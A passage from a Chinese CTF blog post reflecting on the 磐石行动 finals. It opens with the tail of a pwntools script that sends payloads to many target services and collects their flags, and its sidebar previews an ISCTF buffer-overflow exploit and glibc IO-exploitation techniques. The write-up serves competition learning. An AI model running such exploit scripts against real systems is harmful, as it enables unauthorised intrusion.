class="string">b&#x27;4198688&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Chat ended.\n&#x27;</span>)</span><br><span class="line">        flag = io.recvline()</span><br><span class="line">        success(flag)</span><br><span class="line">        FLAG += flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment">#print(ip)</span></span><br><span class="line">        io.close()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(FLAG)</span><br></pre></td></tr></table></figure>
+
+<p>本来是想封装一个函数的。但是时间太紧张了，就还是写的比较臃肿。</p>
+<h2 id="四-小节"><a href="#四-小节" class="headerlink" title="四.小节"></a>四.小节</h2><p>这次磐石行动决赛我觉得我是尽力了。虽然还是有遗憾。如果能提前找好自动化提交flag脚本，就有更多时间去找洞了。如果我能更敏感一点，就可以提前把这个<code>oob</code>脚本写出来了。</p>
+<p>当然，说一句抱怨的话，原来线下是能用本地模型的啊！！！不会只有我们还在坚持古法手搓吧…</p>
+<p>这确实是一次很好的体验。它把我的心气打出来了。之前线上的各种ctf比赛总是给我一个不是很好的体验。但是这次线下至少让我感觉，我没拖后腿（甚至是大腿bushi，至少我能凭借自己的实力做的出题，已经是对我学习经历的最好体验了。</p>
+<p>最后，希望我能积累好经验，为下一次，更多机会做好充足准备！</p>
+<p>还是由衷的感谢一下组队的队友，我的师傅，我们校队几位老师傅的帮助。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/">http://example.com/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/26/C++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" title="C++异常处理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-26</div><div class="info-item-2">C++异常处理</div></div><div class="info-2"><div class="info-item-1">C++异常处理机制misc | Hexo C++ 异常处理是一种在程序运行时处理错误和特殊情况的机制。它允许程序在遇到问题时，通过抛出和捕获异常来转移控制流，而不是使用传统的错误处理方法（如通过函数返回值）。C++ 异常处理主要涉及三个关键字：try、catch和throw。 核心工作机制：栈展开 (Stack Unwinding)这是C++异常机制中最重要的一环。当异常被 throw 抛出，且在当前作用域没有找到匹配的 catch 块时，C++ 运行时会去调用者的作用域中寻找，一直沿着函数调用栈向上找。 在这个“向上找”的过程中，C++ 会自动调用当前作用域内所有已构造的局部对象的析构函数，安全地释放资源。这个过程就叫栈展开。这与 RAII（资源获取即初始化）机制完美配合，防止了内存泄漏。 异常展开机制在把控制权交还给 main 函数时，不仅会设置 RIP，还会从栈上恢复 RBP 寄存器，以恢复 main 函数的栈帧环境。 所以说，如果我们能伪造rbp+8的地址，让它指向一个含有c++异常处理的函数。这样做到可以绕过canary等保护。 [第五空间 2022]toolkit链接...</div></div></div></a><a class="pagination-related" href="/2026/05/27/House-of-cat/" title="House of cat"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="info-item-2">House of cat</div></div><div class="info-2"><div class="info-item-1">House of cat链接：[原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪安全社区｜专业技术交流与安全研究论坛 其实和house of apple2的第三条利用链挺相似的。 1234_IO_wfile_seekoff    _IO_switch_to_wget_mode        _IO_WOVERFLOW            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)  _IO_wfile_seekoff 12345678910111213141516171819202122off64_t_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)&#123;  off64_t result;  off64_t delta, new_offset;  long int count;   if (mode == 0)    return do_ftell_wi...</div></div></div></a><a class="pagination-related" href="/2026/02/07/Hgame2026/" title="Hgame2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-07</div><div class="info-item-2">Hgame2026</div></div><div class="info-2"><div class="info-item-1">Hgame 2026第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。 1.EZheap真的ez吗？😂快被虐哭了😢其实是自己菜。 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int choice; // [rsp+4h] [rbp-34h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add()...</div></div></div></a><a class="pagination-related" href="/2026/05/25/House-of-apple2/" title="House_of_apple2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="info-item-2">House_of_apple2</div></div><div class="info-2"><div class="info-item-1">House of apple2这里还是看下roderick师傅的文章便于理解。 链接：[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪安全社区｜专业技术交流与安全研究论坛 由于高版本下，vtable无法被直接伪造（有严格的范围检查）。所以我们主动去调用_wide_data结构体里的函数指针。而_wide_data及其对应的虚表没有任何安全检查机制。通过控制这个“法外之地”，我们达到目的。 我这里主要是记录下几条攻击链条。 1.利用_IO_wfile_overflow函数控制程序执行流1234_IO_wfile_overflow    _IO_wdoallocbuf        _IO_WDOALLOCATE            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)  首先看一下_IO_wfile_overflow函数。 1234567891011121314151617181920wint_t_IO_wfile_overflow (FILE *f, wint_t wch)...</div></div></div></a><a class="pagination-related" href="/2026/05/29/House-of-some/" title="House of some"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-29</div><div class="info-item-2">House of some</div></div><div class="info-2"><div class="info-item-1">House of some这是Csome师傅提出的一种针对较高版本的IO_FILE漏洞利用技巧。 链接：Bring back the stack attack – House of some一种高版本glibc的利用思路 · Csome 该手法利用范围广。攻击提权靠栈上ROP，同时，即使_wide_data-&gt;vtable加上检测，只允许执行虚表内的函数，该手法也可以稳定getshell。 这里首先需要_IO_new_file_underflow这个函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879int_IO_new_file_underflow (FILE *fp)&#123;  ssize_t count;  /* C99 requires EOF to be &quot;sticky&quot;.  */  if ...</div></div></div></a><a class="pagination-related" href="/2025/12/11/ISCTF/" title="ISCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">ISCTF</div></div><div class="info-2"><div class="info-item-1">ISCTF1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。 下面给出exp。 12345678from pwn import *io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,25138)pl = b&#x27;a&#x27; * 108 + p32(0xaddaaaaa)io.sendafter(b&#x27;do you like blueshark?&#x27;,pl)io.interactive()  2.Fmt 经典的格式化字符串泄露。但是这里需要换一下附件的依赖。 由于这里给了libc.so.6，所以我们可...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/" title="磐石行动决赛">磐石行动决赛</a><time datetime="2026-09-20T01:21:51.000Z" title="发表于 2026-09-20 09:21:51">2026-09-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/" title="AWD小记">AWD小记</a><time datetime="2026-09-16T14:38:51.000Z" title="发表于 2026-09-16 22:38:51">2026-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="Thehackerslabs刷题记录">Thehackerslabs刷题记录</a><time datetime="2026-09-09T04:38:13.000Z" title="发表于 2026-09-09 12:38:13">2026-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/06/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%88%9D%E8%B5%9B/" title="磐石行动初赛">磐石行动初赛</a><time datetime="2026-09-06T03:52:16.000Z" title="发表于 2026-09-06 11:52:16">2026-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/29/CVE-2018-7034/" title="CVE-2018-7034 信息泄露">CVE-2018-7034 信息泄露</a><time datetime="2026-08-29T06:38:12.000Z" title="发表于 2026-08-29 14:38:12">2026-08-29</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">CVE复现</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.37em; color: #99a4b2">pwn入门</a> <a href="/tags/AWD/" style="font-size: 1.1em; color: #999">AWD</a> <a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" style="font-size: 1.1em; color: #999">靶机渗透</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/IOT/" style="font-size: 1.23em; color: #999ea6">IOT</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/09/">
+            <span class="card-archive-list-date">
+              九月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/08/">
+            <span class="card-archive-list-date">
+              八月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">45</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-09-20T04:06:39.446Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
